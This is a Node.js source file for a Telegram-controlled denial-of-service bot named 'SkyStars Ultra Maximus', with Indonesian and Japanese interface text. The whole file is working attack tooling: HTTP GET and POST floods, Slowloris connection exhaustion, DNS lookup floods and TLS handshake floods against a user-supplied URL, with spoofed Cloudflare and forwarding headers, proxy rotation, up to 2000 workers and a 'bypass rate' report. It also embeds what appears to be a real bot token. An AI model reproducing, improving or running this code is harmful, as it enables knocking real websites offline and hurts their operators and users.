const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const HttpsProxyAgent = require('https-proxy-agent');
const SocksProxyAgent = require('socks-proxy-agent');
const { v4: uuidv4 } = require('uuid');
const UserAgent = require('user-agents');
const chalk = require('chalk');
const net = require('net');
const http = require('http');
const https = require('https');
const dns = require('dns');

// =============================================
// KONFIGURASI ULTRA MAXIMUS
// =============================================
const CONFIG = {
    telegramToken: '8317200381:AAGQDovoBzhda0gMjYgDowluLX94Wr4Dow0',
    authorizedUsers: [8028341598],
    botName: 'SkyStars Ultra Maximus',
    version: 'v5.0.0-MAXIMUS',
    owner: '@SkyStarsOwner',
    botId: '8028341598',
    maxThreads: 2000,  // Maximum threads for ultimate power
    maxDuration: 600   // 10 minutes maximum
};

const bot = new TelegramBot(CONFIG.telegramToken, { polling: true });
let isAttacking = false;
let runtimeStart = Date.now();

// =============================================
// ULTRA MAXIMUS PROXY DATABASE
// =============================================
const ULTRA_PROXIES = [
    // ADD YOUR PREMIUM PROXIES HERE (Minimum 100+ recommended)
    // Format: 
    // 'http://user:pass@ip:port',
    // 'socks5://user:pass@ip:port'
    // Example:
    // 'http://admin:password@192.168.1.1:8080',
    // 'socks5://user123:pass123@45.76.102.33:1080'
];

// =============================================
// ULTRA MAXIMUS ATTACK ENGINE - SINGLE FEATURE
// =============================================
class UltraMaximusEngine {
    constructor() {
        this.attackWorkers = [];
        this.stats = {
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            bypassedRequests: 0,
            startTime: null,
            rps: 0
        };
        this.attackMethods = [];
    }

    // Generate Ultra Advanced Headers for Cloudflare Bypass
    generateUltraHeaders() {
        const userAgent = new UserAgent();
        const ip = this.generateCloudflareIP();
        
        return {
            'User-Agent': userAgent.toString(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive, Upgrade',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'X-Forwarded-For': ip,
            'X-Forwarded-Host': ip,
            'X-Real-IP': ip,
            'CF-Connecting-IP': ip,
            'CF-IPCountry': 'US',
            'CF-RAY': this.generateCFRay(),
            'CF-Visitor': '{"scheme":"https"}',
            'True-Client-IP': ip,
            'X-Request-ID': uuidv4(),
            'X-CSRF-Token': uuidv4(),
            'Priority': 'u=0, i',
            'TE': 'trailers'
        };
    }

    generateCloudflareIP() {
        const cfRanges = [
            '173.245.48', '103.21.244', '103.22.200', '103.31.4', '141.101.64',
            '108.162.192', '190.93.240', '188.114.96', '197.234.240', '198.41.128',
            '162.158.0', '104.16.0', '172.64.0', '131.0.72'
        ];
        const range = cfRanges[Math.floor(Math.random() * cfRanges.length)];
        return `${range}.${Math.floor(Math.random() * 255)}`;
    }

    generateCFRay() {
        const chars = '0123456789abcdef';
        let ray = '';
        for (let i = 0; i < 16; i++) {
            ray += chars[Math.floor(Math.random() * chars.length)];
        }
        return ray + '-SIN';
    }

    getMaximusProxy() {
        if (ULTRA_PROXIES.length === 0) return null;
        const proxy = ULTRA_PROXIES[Math.floor(Math.random() * ULTRA_PROXIES.length)];
        try {
            if (proxy.startsWith('socks')) {
                return new SocksProxyAgent(proxy);
            } else {
                return new HttpsProxyAgent(proxy);
            }
        } catch (error) {
            return null;
        }
    }

    // SINGLE ULTRA MAXIMUS ATTACK METHOD
    async startUltraMaximusAttack(target, duration, power) {
        return new Promise((resolve) => {
            const endTime = Date.now() + (duration * 1000);
            this.stats = {
                totalRequests: 0,
                successfulRequests: 0,
                failedRequests: 0,
                bypassedRequests: 0,
                startTime: new Date(),
                rps: 0
            };

            console.log(chalk.red(`💥 STARTING ULTRA MAXIMUS ATTACK - POWER: ${power}/100`));

            // Calculate thread count based on power (MAXIMUM SCALING)
            const threadCount = Math.min(CONFIG.maxThreads, Math.floor(power * 20));
            console.log(chalk.yellow(`🔧 Creating ${threadCount} ULTRA threads...`));

            // Start multiple attack vectors simultaneously
            this.attackMethods = [
                this.hyperHttpStorm(target, endTime, power),
                this.megaPostTsunami(target, endTime, power),
                this.slowlorisApocalypse(target, endTime, power),
                this.dnsHurricane(target, endTime, power),
                this.sslTornado(target, endTime, power)
            ];

            // Create worker army
            for (let i = 0; i < threadCount; i++) {
                this.attackWorkers.push(this.ultraMaximusWorker(target, endTime, power, i));
            }

            // Real-time stats monitoring
            const statsMonitor = setInterval(() => {
                const currentTime = Date.now();
                const elapsed = (currentTime - this.stats.startTime) / 1000;
                this.stats.rps = elapsed > 0 ? (this.stats.totalRequests / elapsed).toFixed(2) : 0;

                if (currentTime > endTime || !isAttacking) {
                    clearInterval(statsMonitor);
                    this.attackWorkers = [];
                    this.attackMethods = [];
                    resolve(this.stats);
                }
            }, 1000);
        });
    }

    // HYPER HTTP STORM - Maximum Request Flood
    async hyperHttpStorm(target, endTime, power) {
        const axiosInstance = axios.create({
            timeout: 3000, // Ultra fast timeout
            maxRedirects: 0, // No redirects for speed
            validateStatus: () => true // Accept all status codes
        });

        let stormCount = 0;
        const maxStormRequests = power * 1000;

        while (Date.now() < endTime && isAttacking && stormCount < maxStormRequests) {
            try {
                const config = {
                    headers: this.generateUltraHeaders(),
                    httpsAgent: this.getMaximusProxy(),
                    httpAgent: this.getMaximusProxy()
                };

                // Batch requests for maximum throughput
                const batchSize = Math.min(20, Math.floor(power / 5));
                const requests = [];
                
                for (let i = 0; i < batchSize; i++) {
                    requests.push(axiosInstance.get(target, config));
                }

                const results = await Promise.allSettled(requests);
                
                results.forEach(result => {
                    this.stats.totalRequests++;
                    stormCount++;
                    
                    if (result.status === 'fulfilled') {
                        const response = result.value;
                        if (response.status < 500) {
                            this.stats.successfulRequests++;
                            if (response.status === 200) {
                                this.stats.bypassedRequests++;
                            }
                        } else {
                            this.stats.failedRequests++;
                        }
                    } else {
                        this.stats.failedRequests++;
                    }
                });

                // ULTRA HIGH FREQUENCY - Minimal delay
                if (power > 95) {
                    await new Promise(resolve => setImmediate(resolve)); // No delay for max power
                } else {
                    await new Promise(resolve => setTimeout(resolve, Math.max(0, 10 - (power / 10))));
                }

            } catch (error) {
                this.stats.totalRequests++;
                this.stats.failedRequests++;
                stormCount++;
            }
        }
    }

    // MEGA POST TSUNAMI - Advanced POST Attack
    async megaPostTsunami(target, endTime, power) {
        const axiosInstance = axios.create({
            timeout: 5000,
            validateStatus: () => true
        });

        while (Date.now() < endTime && isAttacking) {
            try {
                const config = {
                    headers: {
                        ...this.generateUltraHeaders(),
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    httpsAgent: this.getMaximusProxy()
                };

                const postData = this.generateTsunamiData();
                
                await axiosInstance.post(target, postData, config);
                this.stats.totalRequests++;
                this.stats.successfulRequests++;

                await new Promise(resolve => setTimeout(resolve, Math.max(1, 50 - power)));

            } catch (error) {
                this.stats.totalRequests++;
                this.stats.failedRequests++;
            }
        }
    }

    generateTsunamiData() {
        const dataTypes = [
            `username=${uuidv4()}&password=${uuidv4()}&login=submit`,
            `email=${uuidv4()}@gmail.com&message=${uuidv4().repeat(10)}&submit=contact`,
            `search=${uuidv4()}&category=all&sort=price&filter=active`,
            `product_id=${Math.floor(Math.random() * 9999)}&quantity=${Math.floor(Math.random() * 10)}&action=add`,
            `user=${uuidv4()}&pass=${uuidv4()}&remember=1&token=${uuidv4()}`
        ];
        return dataTypes[Math.floor(Math.random() * dataTypes.length)];
    }

    // SLOWLORIS APOCALYPSE - Resource Exhaustion
    async slowlorisApocalypse(target, endTime, power) {
        const { URL } = require('url');
        const parsedUrl = new URL(target);
        const host = parsedUrl.hostname;
        const port = parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80);
        
        const apocalypseSockets = [];
        const maxSockets = Math.min(5000, power * 50);

        while (Date.now() < endTime && isAttacking && apocalypseSockets.length < maxSockets) {
            try {
                const socket = new net.Socket();
                socket.setTimeout(60000);
                
                socket.connect(port, host, () => {
                    // Send partial HTTP request to keep connection open
                    const partialHeaders = this.generateUltraHeaders();
                    let request = `GET ${parsedUrl.pathname} HTTP/1.1\r\n`;
                    request += `Host: ${host}\r\n`;
                    request += `User-Agent: ${partialHeaders['User-Agent']}\r\n`;
                    request += `Accept: ${partialHeaders['Accept']}\r\n`;
                    // Don't complete the request - keep connection hanging
                    
                    socket.write(request);
                    
                    // Keep sending headers periodically
                    const keepAlive = setInterval(() => {
                        if (socket.destroyed || !isAttacking) {
                            clearInterval(keepAlive);
                            return;
                        }
                        socket.write(`X-${uuidv4()}: ${Math.random()}\r\n`);
                    }, 15000);

                    socket.on('close', () => {
                        clearInterval(keepAlive);
                        const index = apocalypseSockets.indexOf(socket);
                        if (index > -1) apocalypseSockets.splice(index, 1);
                    });

                    socket.on('error', () => {
                        clearInterval(keepAlive);
                    });

                    apocalypseSockets.push(socket);
                });

                socket.on('error', () => {
                    // Silent error handling
                });

                await new Promise(resolve => setTimeout(resolve, 10));

            } catch (error) {
                // Continue despite errors
            }
        }

        // Maintain apocalypse until end time
        while (Date.now() < endTime && isAttacking) {
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        // Cleanup
        apocalypseSockets.forEach(socket => {
            try {
                socket.destroy();
            } catch (e) {}
        });
    }

    // DNS HURRICANE - Infrastructure Stress
    async dnsHurricane(target, endTime, power) {
        const { URL } = require('url');
        const parsedUrl = new URL(target);
        const hostname = parsedUrl.hostname;

        while (Date.now() < endTime && isAttacking) {
            try {
                // Multiple DNS queries to stress infrastructure
                const dnsPromises = [];
                const queryCount = Math.min(10, Math.floor(power / 10));

                for (let i = 0; i < queryCount; i++) {
                    dnsPromises.push(new Promise((resolve) => {
                        dns.lookup(hostname, (err, address) => {
                            this.stats.totalRequests++;
                            if (!err) {
                                this.stats.successfulRequests++;
                            } else {
                                this.stats.failedRequests++;
                            }
                            resolve();
                        });
                    }));

                    dnsPromises.push(new Promise((resolve) => {
                        dns.resolve4(hostname, (err, addresses) => {
                            this.stats.totalRequests++;
                            if (!err) {
                                this.stats.successfulRequests++;
                            } else {
                                this.stats.failedRequests++;
                            }
                            resolve();
                        });
                    }));
                }

                await Promise.allSettled(dnsPromises);
                await new Promise(resolve => setTimeout(resolve, Math.max(1, 100 - power)));

            } catch (error) {
                this.stats.totalRequests++;
                this.stats.failedRequests++;
            }
        }
    }

    // SSL TORNADO - SSL/TLS Handshake Exhaustion
    async sslTornado(target, endTime, power) {
        const { URL } = require('url');
        const parsedUrl = new URL(target);
        const host = parsedUrl.hostname;
        const port = parsedUrl.port || 443;

        while (Date.now() < endTime && isAttacking) {
            try {
                const socket = new net.Socket();
                const sslSocket = require('tls').connect({
                    host: host,
                    port: port,
                    socket: socket,
                    servername: host,
                    rejectUnauthorized: false
                });

                sslSocket.on('secureConnect', () => {
                    this.stats.totalRequests++;
                    this.stats.successfulRequests++;
                    sslSocket.destroy();
                });

                sslSocket.on('error', () => {
                    this.stats.totalRequests++;
                    this.stats.failedRequests++;
                    sslSocket.destroy();
                });

                socket.on('error', () => {
                    this.stats.totalRequests++;
                    this.stats.failedRequests++;
                });

                await new Promise(resolve => setTimeout(resolve, Math.max(1, 50 - power)));

            } catch (error) {
                this.stats.totalRequests++;
                this.stats.failedRequests++;
            }
        }
    }

    // ULTRA MAXIMUS WORKER - Main Attack Worker
    async ultraMaximusWorker(target, endTime, power, workerId) {
        const axiosInstance = axios.create({
            timeout: 4000,
            maxRedirects: 2,
            validateStatus: () => true
        });

        const methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE', 'PATCH'];
        let consecutiveErrors = 0;
        let workerRequests = 0;
        const maxWorkerRequests = power * 500;

        while (Date.now() < endTime && isAttacking && consecutiveErrors < 100 && workerRequests < maxWorkerRequests) {
            try {
                const method = methods[Math.floor(Math.random() * methods.length)];
                const config = {
                    method: method,
                    url: target,
                    headers: this.generateUltraHeaders(),
                    httpsAgent: this.getMaximusProxy(),
                    httpAgent: this.getMaximusProxy(),
                    data: method !== 'GET' ? this.generateTsunamiData() : undefined
                };

                const startTime = Date.now();
                const response = await axiosInstance.request(config);
                const responseTime = Date.now() - startTime;

                this.stats.totalRequests++;
                workerRequests++;

                if (response.status >= 200 && response.status < 500) {
                    this.stats.successfulRequests++;
                    consecutiveErrors = 0;
                    
                    if (response.status === 200) {
                        this.stats.bypassedRequests++;
                    }
                } else {
                    this.stats.failedRequests++;
                    consecutiveErrors++;
                }

                // Adaptive ultra-high frequency
                let delay = Math.max(0, 30 - power + (responseTime / 200));
                if (power > 98) delay = 0; // Absolute maximum power = zero delay
                
                if (delay > 0) {
                    await new Promise(resolve => setTimeout(resolve, delay));
                } else {
                    await new Promise(resolve => setImmediate(resolve));
                }

            } catch (error) {
                this.stats.totalRequests++;
                this.stats.failedRequests++;
                workerRequests++;
                consecutiveErrors++;
                
                await new Promise(resolve => setTimeout(resolve, Math.max(1, 5)));
            }
        }
    }

    stopUltraMaximus() {
        this.attackWorkers = [];
        this.attackMethods = [];
        isAttacking = false;
        console.log(chalk.yellow('🛑 ULTRA MAXIMUS ATTACK TERMINATED'));
    }

    getUltraStats() {
        if (!this.stats.startTime) return null;
        
        const duration = (Date.now() - this.stats.startTime) / 1000;
        const rps = this.stats.rps;
        const successRate = this.stats.totalRequests > 0 ? 
            (this.stats.successfulRequests / this.stats.totalRequests * 100).toFixed(2) : 0;
        const bypassRate = this.stats.totalRequests > 0 ?
            (this.stats.bypassedRequests / this.stats.totalRequests * 100).toFixed(2) : 0;

        return {
            ...this.stats,
            duration: duration.toFixed(2),
            rps: rps,
            successRate: successRate,
            bypassRate: bypassRate
        };
    }
}

const ultraMaximus = new UltraMaximusEngine();

// =============================================
// BOT TELEGRAM HANDLER - ULTRA MAXIMUS
// =============================================
function getRuntime() {
    const runtime = Math.floor((Date.now() - runtimeStart) / 1000);
    const days = Math.floor(runtime / (24 * 3600));
    const hours = Math.floor((runtime % (24 * 3600)) / 3600);
    const minutes = Math.floor((runtime % 3600) / 60);
    const seconds = Math.floor(runtime % 60);
    return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${seconds} Detik`;
}

function formatNumber(num) {
    if (num >= 1000000) {
        return (num / 1000000).toFixed(2) + 'M';
    } else if (num >= 1000) {
        return (num / 1000).toFixed(2) + 'K';
    }
    return num.toString();
}

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    if (!CONFIG.authorizedUsers.includes(chatId)) {
        return bot.sendMessage(chatId, '❌ Unauthorized access!');
    }

    const welcomeMessage = `
# SkyStars ULTRA MAXIMUS  
**Single Ultimate Attack System**  

---

## [SkyStars | ULTRA MAXIMUS]  
**超超強力**  
こんにちは @${msg.from.username} 私はSkyStars ULTRA MAXIMUSです  
楽しく使ってください。開発者は超超ハンサムだ  

---

## [SkyStars, ULTRA MAXIMUS FOR YOU]  

---

### 超超情報 SkyStars MAXIMUS
- **POWER@ABSOLUTE_MAXIMUM**  
- **所有者：${CONFIG.owner}**  
- **バージョン：${CONFIG.version}**  
- **超超プレミアムステータス：**  
  - ULTRA MAXIMUS POWER ACTIVE  
  - ランタイム：${getRuntime()}  
  - あなたのID：${CONFIG.botId}  

---

### TA. /maximus <url> <time> <power> で超超攻撃開始

---

### XX PENCET TOMBOL MAXIMUS DIBAWAH UNTUK MEMULAI

---

## 超超強力攻撃準備完了

${new Date().toLocaleTimeString('en-US', { hour12: false })}  

---

### MAXIMUS SETTINGS  
OWNER MENU - ABSOLUTE POWER

---

### SkyStars ULTRA MAXIMUS ATTACK 超超強力
    `;

    bot.sendMessage(chatId, welcomeMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: '💀 START ULTRA MAXIMUS ATTACK', callback_data: 'start_maximus' }],
                [{ text: '📊 MAXIMUS LIVE STATS', callback_data: 'maximus_stats' }],
                [{ text: '🛑 KILL MAXIMUS', callback_data: 'kill_maximus' }],
                [{ text: '⚡ MAXIMUS INFO', callback_data: 'maximus_info' }]
            ]
        }
    });
});

// Callback handler
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    if (!CONFIG.authorizedUsers.includes(chatId)) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: 'Unauthorized!' });
    }

    try {
        switch (data) {
            case 'start_maximus':
                await bot.sendMessage(chatId, 
                    '💀 **SKYSTARS ULTRA MAXIMUS ATTACK**\n\n' +
                    'Kirim perintah dengan format:\n' +
                    '`/maximus <url> <duration> <power>`\n\n' +
                    'Contoh:\n' +
                    '`/maximus https://example.com 180 99`\n\n' +
                    '**ULTRA MAXIMUS Parameters:**\n' +
                    '• url: Target website\n' +
                    '• duration: Durasi attack (1-600 detik)\n' +
                    '• power: Kekuatan attack (1-100) MAXIMUM\n\n' +
                    '**MAXIMUS FEATURES:**\n' +
                    '💀 Hyper HTTP Storm\n' +
                    '🌪 Mega POST Tsunami\n' +
                    '☠️ Slowloris Apocalypse\n' +
                    '🌀 DNS Hurricane\n' +
                    '⚡ SSL Tornado\n' +
                    '🔓 Advanced Cloudflare Bypass\n' +
                    '🚀 Maximum RPS Capacity'
                );
                break;

            case 'maximus_stats':
                const stats = ultraMaximus.getUltraStats();
                if (stats && isAttacking) {
                    const statsMsg = `
📊 **ULTRA MAXIMUS LIVE STATS**

⚡ Status: 🟢 MAXIMUS ATTACKING
📤 Total Requests: ${formatNumber(stats.totalRequests)}
✅ Successful: ${formatNumber(stats.successfulRequests)}
❌ Failed: ${formatNumber(stats.failedRequests)}
🎯 Bypassed: ${formatNumber(stats.bypassedRequests)}
📈 RPS: ${stats.rps}
🎯 Success Rate: ${stats.successRate}%
🔓 Bypass Rate: ${stats.bypassRate}%
⏱ Duration: ${stats.duration}s
🕒 Started: ${stats.startTime.toLocaleTimeString()}

💀 **POWER: ABSOLUTE MAXIMUM**
                    `;
                    bot.sendMessage(chatId, statsMsg);
                } else {
                    bot.sendMessage(chatId, 'ℹ️ Tidak ada attack ULTRA MAXIMUS yang berjalan.');
                }
                break;

            case 'kill_maximus':
                ultraMaximus.stopUltraMaximus();
                bot.sendMessage(chatId, 
                    '🛑 **ULTRA MAXIMUS ATTACK TERMINATED!**\n\n' +
                    'All attack vectors have been destroyed!\n' +
                    'System shutdown complete.'
                );
                break;

            case 'maximus_info':
                const botInfo = `
🤖 **SKYSTARS ULTRA MAXIMUS INFORMATION**

🌟 Version: ${CONFIG.version}
👤 Owner: ${CONFIG.owner}
🆔 Bot ID: ${CONFIG.botId}
🕒 Runtime: ${getRuntime()}
⚡ Status: ${isAttacking ? '🟢 MAXIMUS ATTACKING' : '🟢 READY'}
💀 Max Threads: ${CONFIG.maxThreads}
⏱ Max Duration: ${CONFIG.maxDuration}s

**MAXIMUS Features:**
💀 Single Ultimate Attack Method
🌪 Multi-Vector Simultaneous Assault
🔓 Advanced Cloudflare Bypass
🚀 Maximum RPS Capacity
☠️ Resource Exhaustion Techniques
🌀 Infrastructure Level Attacks

**WARNING:** ABSOLUTE MAXIMUM POWER - USE WITH EXTREME CAUTION!
                `;
                bot.sendMessage(chatId, botInfo);
                break;
        }

        bot.answerCallbackQuery(callbackQuery.id);
    } catch (error) {
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Error: ' + error.message });
    }
});

// ULTRA MAXIMUS ATTACK COMMAND
bot.onText(/\/maximus (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    if (!CONFIG.authorizedUsers.includes(chatId)) {
        return bot.sendMessage(chatId, '❌ Unauthorized access!');
    }

    if (isAttacking) {
        return bot.sendMessage(chatId, '❌ Ultra Maximus attack sudah berjalan! Gunakan /kill terlebih dahulu.');
    }

    const params = match[1].split(' ');
    if (params.length < 3) {
        return bot.sendMessage(chatId, '❌ Format: /maximus <url> <duration> <power>');
    }

    const [url, duration, power] = params;
    
    // Validation
    if (!url.startsWith('http')) {
        return bot.sendMessage(chatId, '❌ URL harus dimulai dengan http:// atau https://');
    }

    const durationNum = parseInt(duration);
    const powerNum = parseInt(power);

    if (durationNum < 1 || durationNum > CONFIG.maxDuration) {
        return bot.sendMessage(chatId, `❌ Duration harus antara 1-${CONFIG.maxDuration} detik`);
    }

    if (powerNum < 1 || powerNum > 100) {
        return bot.sendMessage(chatId, '❌ Power harus antara 1-100');
    }

    // Start ULTRA MAXIMUS attack
    isAttacking = true;
    
    const attackMsg = await bot.sendMessage(chatId, 
        `💀 **SKYSTARS ULTRA MAXIMUS ATTACK INITIATED!**

🎯 Target: ${url}
⏰ Duration: ${durationNum} detik
💀 Power: ${powerNum}/100 - ABSOLUTE MAXIMUM
⚡ Method: ULTRA MAXIMUS MULTI-VECTOR
🕒 Start: ${new Date().toLocaleTimeString()}

🔮 **Initializing ULTRA MAXIMUS systems...**
🌪️ **Hyper HTTP Storm: ACTIVATED**
☠️ **Slowloris Apocalypse: ENABLED**
🌀 **DNS Hurricane: DEPLOYED**
⚡ **SSL Tornado: SPINNING**
🔓 **Cloudflare Bypass: MAXIMUM**

**Status:** 🚀 LAUNCHING ULTRA MAXIMUS...
        `
    );

    try {
        // Real-time stats updates
        const statsInterval = setInterval(async () => {
            if (!isAttacking) {
                clearInterval(statsInterval);
                return;
            }
            
            const stats = ultraMaximus.getUltraStats();
            if (stats) {
                const liveStats = `
📊 **ULTRA MAXIMUS LIVE STATS**

📤 Requests: ${formatNumber(stats.totalRequests)}
✅ Success: ${formatNumber(stats.successfulRequests)}
🎯 Bypassed: ${formatNumber(stats.bypassedRequests)}
📈 RPS: ${stats.rps}
⏱ Duration: ${stats.duration}s
💀 Power: ${powerNum}/100

🔓 **Bypass Rate:** ${stats.bypassRate}%
⚡ **Success Rate:** ${stats.successRate}%
                `;
                
                try {
                    await bot.editMessageText(liveStats, {
                        chat_id: chatId,
                        message_id: attackMsg.message_id
                    });
                } catch (e) {
                    // Ignore edit errors
                }
            }
        }, 3000);

        const result = await ultraMaximus.startUltraMaximusAttack(url, durationNum, powerNum);
        
        clearInterval(statsInterval);

        const report = `
🛑 **ULTRA MAXIMUS ATTACK COMPLETED**

📊 Final MAXIMUS Statistics:
📤 Total Requests: ${formatNumber(result.totalRequests)}
✅ Successful: ${formatNumber(result.successfulRequests)}
❌ Failed: ${formatNumber(result.failedRequests)}
🎯 Bypassed: ${formatNumber(result.bypassedRequests)}
📈 Success Rate: ${result.successRate}%
🔓 Bypass Rate: ${result.bypassRate}%
⚡ Peak RPS: ${result.rps}
⏱ Duration: ${result.duration}s

🎯 Target: ${url}
💀 Power: ${powerNum}/100 - ABSOLUTE MAXIMUM

**Status:** ✅ ULTRA MAXIMUS MISSION ACCOMPLISHED

${result.bypassedRequests > 5000 ? '🔓 **CLOUDFLARE BYPASS: COMPLETE SUCCESS**' : 
  result.bypassedRequests > 1000 ? '🔓 **CLOUDFLARE BYPASS: PARTIAL SUCCESS**' : 
  '🛡️ **CLOUDFLARE: HEAVY RESISTANCE**'}

💀 **ATTACK EFFECTIVENESS:** ${result.successRate > 80 ? 'MAXIMUM' : result.successRate > 50 ? 'HIGH' : 'MODERATE'}
        `;

        await bot.editMessageText(report, {
            chat_id: chatId,
            message_id: attackMsg.message_id
        });

    } catch (error) {
        await bot.editMessageText(`❌ **ULTRA MAXIMUS ATTACK ERROR:** ${error.message}`, {
            chat_id: chatId,
            message_id: attackMsg.message_id
        });
    } finally {
        isAttacking = false;
    }
});

// Kill command
bot.onText(/\/kill/, (msg) => {
    const chatId = msg.chat.id;
    ultraMaximus.stopUltraMaximus();
    bot.sendMessage(chatId, 
        '🛑 **ULTRA MAXIMUS TERMINATED WITH EXTREME PREJUDICE!**\n\n' +
        'All attack vectors have been eliminated.\n' +
        'System returning to safe mode.'
    );
});

// Stats command
bot.onText(/\/stats/, (msg) => {
    const chatId = msg.chat.id;
    const stats = ultraMaximus.getUltraStats();
    
    if (stats && isAttacking) {
        const statsMsg = `
📊 **ULTRA MAXIMUS REAL-TIME STATS**

⚡ Status: 🟢 MAXIMUS ATTACKING
📤 Total Requests: ${formatNumber(stats.totalRequests)}
✅ Success: ${formatNumber(stats.successfulRequests)}
🎯 Bypassed: ${formatNumber(stats.bypassedRequests)}
📈 RPS: ${stats.rps}
🎯 Success Rate: ${stats.successRate}%
🔓 Bypass Rate: ${stats.bypassRate}%
⏱ Duration: ${stats.duration}s

💀 **POWER: ULTRA MAXIMUS**
        `;
        bot.sendMessage(chatId, statsMsg);
    } else {
        bot.sendMessage(chatId, 'ℹ️ Tidak ada attack ULTRA MAXIMUS yang berjalan.');
    }
});

console.log(chalk.red(`
==========================================
      💀 SKYSTARS ULTRA MAXIMUS
      Version: ${CONFIG.version}
     Absolute Power Activated
==========================================
Status: ✅ ULTRA MAXIMUS READY
Owner: ${CONFIG.owner}
Bot ID: ${CONFIG.botId}
Max Threads: ${CONFIG.maxThreads}
Max Duration: ${CONFIG.maxDuration}s
ULTRA MAXIMUS Engine: ✅ LOADED
`));